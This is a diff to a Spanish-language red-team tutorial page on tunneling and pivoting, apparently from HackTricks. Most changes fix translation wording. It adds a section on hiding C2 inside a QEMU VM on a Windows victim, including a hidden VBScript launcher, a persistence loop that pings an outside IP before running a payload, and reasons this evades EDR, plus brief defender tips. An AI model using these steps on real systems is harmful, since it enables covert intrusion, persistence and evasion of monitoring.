@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Abre un puerto en el teamserver escuchando en todas las interfaces que se pueden usar para **rutar el tráfico a través del beacon**.
+Abre un puerto en el teamserver que escuche en todas las interfaces que se pueden usar para **rutar el tráfico a través del beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> En este caso, el **puerto se abre en el host beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
+> En este caso, el **puerto se abre en el host del beacon**, no en el Team Server y el tráfico se envía al Team Server y de allí al host:puerto indicado.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -157,8 +157,8 @@ rportfwd stop [bind port]
 Para tener en cuenta:
 
 - La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
-- El tráfico está **tuneado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
-- **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
+- El tráfico está **tuneleado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
+- **No se requieren privilegios de administrador** para crear reenvíos de puerto reversos en puertos altos.
 
 ### rPort2Port local
 
@@ -324,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
+Es como una versión de consola de PuTTY (las opciones son muy similares a un cliente ssh).
 
 Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
@@ -348,9 +348,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ## SocksOverRDP & Proxifier
 
 Necesitas tener **acceso RDP sobre el sistema**.\
-Descarga:
+Descargar:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **túnel de paquetes sobre la conexión RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **tunneling packets over the RDP connection**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
@@ -358,9 +358,9 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **connect** a la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que dice que el **SocksOverRDP plugin is enabled**, y estará **listen** en **127.0.0.1:1080**.
+Ahora podemos **conectar** a la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y escuchará en **127.0.0.1:1080**.
 
-**Connect** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
+**Conéctate** a través de **RDP** y sube y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -555,7 +555,7 @@ El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen
 cloudflared tunnel --url http://localhost:8080
 # => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
 ```
-### Pivot de SOCKS5
+### SOCKS5 pivot
 ```bash
 # Turn the tunnel into a SOCKS5 proxy on port 1080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
@@ -574,11 +574,11 @@ Iniciar el conector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Porque todo el tráfico sale del host **saliente por 443**, los túneles de Cloudflared son una forma simple de eludir las ACL de entrada o los límites de NAT. Ten en cuenta que el binario generalmente se ejecuta con privilegios elevados; usa contenedores o la bandera `--user` cuando sea posible.
+Porque todo el tráfico sale del host **saliente por 443**, los túneles de Cloudflared son una forma simple de eludir las ACL de ingreso o los límites de NAT. Ten en cuenta que el binario generalmente se ejecuta con privilegios elevados; usa contenedores o la bandera `--user` cuando sea posible.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) es un proxy inverso en Go que se mantiene activamente y que soporta **TCP, UDP, HTTP/S, SOCKS y P2P NAT-hole-punching**. A partir de **v0.53.0 (mayo de 2024)**, puede actuar como un **SSH Tunnel Gateway**, por lo que un host objetivo puede crear un túnel inverso utilizando solo el cliente OpenSSH estándar; no se requiere binario adicional.
+[`frp`](https://github.com/fatedier/frp) es un proxy inverso en Go que se mantiene activamente y que soporta **TCP, UDP, HTTP/S, SOCKS y P2P NAT-hole-punching**. A partir de **v0.53.0 (mayo de 2024)**, puede actuar como un **SSH Tunnel Gateway**, por lo que un host objetivo puede iniciar un túnel inverso utilizando solo el cliente OpenSSH estándar; no se requiere binario adicional.
 
 ### Túnel TCP inverso clásico
 ```bash
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar ninguna herramienta adicional, lo que es ideal para pivotar aprovechando recursos existentes.
+El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar ninguna herramienta adicional, lo que es ideal para pivotar viviendo de la tierra.
+
+## Túneles encubiertos basados en VM con QEMU
+
+La red de modo usuario de QEMU (`-netdev user`) soporta una opción llamada `hostfwd` que **vincula un puerto TCP/UDP en el *host* y lo reenvía al *invitado***. Cuando el invitado ejecuta un daemon SSH completo, la regla hostfwd te proporciona una caja de salto SSH desechable que vive completamente dentro de una VM efímera, perfecta para ocultar el tráfico C2 de EDR porque toda la actividad y archivos maliciosos permanecen en el disco virtual.
+
+### Línea de comando rápida
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• El comando anterior lanza una imagen de **Tiny Core Linux** (`tc.qcow2`) en RAM.  
+• El puerto **2222/tcp** en el host de Windows se reenvía de manera transparente al **22/tcp** dentro del invitado.  
+• Desde el punto de vista del atacante, el objetivo simplemente expone el puerto 2222; cualquier paquete que lo alcance es manejado por el servidor SSH que se ejecuta en la VM.  
+
+### Lanzando de manera sigilosa a través de VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Ejecutar el script con `cscript.exe //B update.vbs` mantiene la ventana oculta.
+
+### Persistencia en el huésped
+
+Debido a que Tiny Core es sin estado, los atacantes generalmente:
+
+1. Dejan el payload en `/opt/123.out`
+2. Añaden a `/opt/bootlocal.sh`:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Agregan `home/tc` y `opt` a `/opt/filetool.lst` para que el payload se empaquete en `mydata.tgz` al apagarse.
+
+### Por qué esto evade la detección
+
+• Solo dos ejecutables no firmados (`qemu-system-*.exe`) tocan el disco; no se instalan controladores ni servicios.  
+• Los productos de seguridad en el host ven **tráfico de loopback benigno** (el C2 real termina dentro de la VM).  
+• Los escáneres de memoria nunca analizan el espacio del proceso malicioso porque vive en un sistema operativo diferente.
+
+### Consejos para Defender
+
+• Alertar sobre **binarios inesperados de QEMU/VirtualBox/KVM** en rutas escribibles por el usuario.  
+• Bloquear conexiones salientes que se originen de `qemu-system*.exe`.  
+• Buscar puertos de escucha raros (2222, 10022, …) que se vinculen inmediatamente después de un lanzamiento de QEMU.
+
+---
 
 ## Otras herramientas para verificar
 
-- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
-- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)  
+- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)  
+
+## Referencias
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
 
 {{#include ../banners/hacktricks-training.md}}
